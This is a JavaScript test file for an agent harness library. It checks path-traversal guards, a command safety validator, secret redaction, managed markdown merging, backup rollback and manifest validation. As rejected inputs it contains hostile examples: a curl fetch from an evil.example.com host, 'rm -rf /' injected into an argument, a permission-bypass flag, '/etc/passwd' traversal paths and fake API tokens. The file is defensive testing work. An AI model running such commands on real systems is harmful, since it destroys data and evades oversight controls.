import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, it } from "node:test";
import {
  BackupManager,
  createManifestFromProfile,
  HarnessCatalog,
  mergeManagedMarkdown,
  redactObjectSecrets,
  redactSecrets,
  resolveSafeWorkspacePath,
  validateAgainstSchema,
  validateManifestPoliciesAndDependencies,
  validateSafeCommand
} from "../dist/index.js";

describe("Harness Core — Security, Schemas, Catalog & Manifest", () => {
  it("prevents path traversal outside workspace root", () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "dlm-sec-"));
    try {
      const safe = resolveSafeWorkspacePath(tmp, ".agents/harness.yaml");
      assert.equal(safe, path.join(tmp, ".agents/harness.yaml"));

      assert.throws(
        () => resolveSafeWorkspacePath(tmp, "../../etc/passwd"),
        /path traversal detected/i
      );
      assert.throws(
        () => resolveSafeWorkspacePath(tmp, "/etc/passwd"),
        /expected relative path/i
      );
      assert.throws(
        () => resolveSafeWorkspacePath(tmp, "bad\0file.txt"),
        /null byte/i
      );
    } finally {
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  });

  it("blocks untrusted executables, shell metacharacters, and permission bypass flags", () => {
    assert.equal(validateSafeCommand("dotnet", ["build", "--nologo"]).safe, true);
    assert.equal(validateSafeCommand("npm", ["test"]).safe, true);

    const untrusted = validateSafeCommand("curl", ["https://evil.example.com/sh"]);
    assert.equal(untrusted.safe, false);

    const bypass = validateSafeCommand("node", ["script.js", "--dangerously-skip-permissions"]);
    assert.equal(bypass.safe, false);

    const meta = validateSafeCommand("npm", ["test; rm -rf /"]);
    assert.equal(meta.safe, false);

    const destructive = validateSafeCommand("git", ["reset --hard"], false);
    assert.equal(destructive.safe, false);
  });

  it("redacts secrets in strings and nested objects", () => {
    const raw =
      "ANTHROPIC_API_KEY=sk-ant-api03-1234567890abcdef token=ghp_1234567890abcdefghijklm postgres://user:supersecret@localhost:5432/db";
    const redacted = redactSecrets(raw);
    assert.ok(!redacted.includes("sk-ant-api03"));
    assert.ok(!redacted.includes("ghp_1234567890"));
    assert.ok(!redacted.includes("supersecret"));

    const obj = redactObjectSecrets({
      apiKey: "secret-123",
      nested: {
        note: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
      }
    });
    assert.equal(obj.apiKey, "[REDACTED]");
    assert.ok(!obj.nested.note.includes("eyJhbGci"));
  });

  it("merges managed markdown sections without clobbering developer edits", () => {
    const devContent = "# My Custom Project\n\nCustom developer notes.\n";
    const firstMerge = mergeManagedMarkdown(devContent, "Managed Section v1");
    assert.equal(firstMerge.ownership, "merged-markers");
    assert.ok(firstMerge.content.includes("Custom developer notes."));
    assert.ok(firstMerge.content.includes("Managed Section v1"));

    const secondMerge = mergeManagedMarkdown(firstMerge.content, "Managed Section v2");
    assert.equal(secondMerge.ownership, "merged-markers");
    assert.ok(secondMerge.content.includes("Custom developer notes."));
    assert.ok(secondMerge.content.includes("Managed Section v2"));
    assert.ok(!secondMerge.content.includes("Managed Section v1"));
  });

  it("creates backups and rolls back modified and newly created files", () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "dlm-backup-"));
    try {
      const fileA = path.join(tmp, "existing.txt");
      const fileB = path.join(tmp, "newfile.txt");
      fs.writeFileSync(fileA, "original-content", "utf8");

      const mgr = new BackupManager(tmp);
      const meta = mgr.createBackup(["existing.txt", "newfile.txt"], "test-backup");

      fs.writeFileSync(fileA, "mutated-content", "utf8");
      fs.writeFileSync(fileB, "created-later", "utf8");

      mgr.rollback(meta.backupId);
      assert.equal(fs.readFileSync(fileA, "utf8"), "original-content");
      assert.equal(fs.existsSync(fileB), false);
    } finally {
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  });

  it("discovers catalog profiles, skills, and workflows and validates manifest schema", () => {
    const catalog = new HarnessCatalog();
    const profiles = catalog.listProfiles();
    assert.ok(profiles.length >= 3);

    const skills = catalog.listSkills();
    assert.ok(skills.some((s) => s.name === "tdd"));
    assert.ok(skills.some((s) => s.name === "dotnet-backend"));

    const workflows = catalog.listWorkflows();
    assert.equal(workflows.length, 5);

    const manifest = createManifestFromProfile(catalog, "/tmp/demo-service", "dotnet");
    const schemaIssues = validateAgainstSchema("harness-manifest", manifest);
    assert.equal(schemaIssues.length, 0);

    const depIssues = validateManifestPoliciesAndDependencies(manifest, catalog);
    assert.equal(depIssues.length, 0);
  });
});
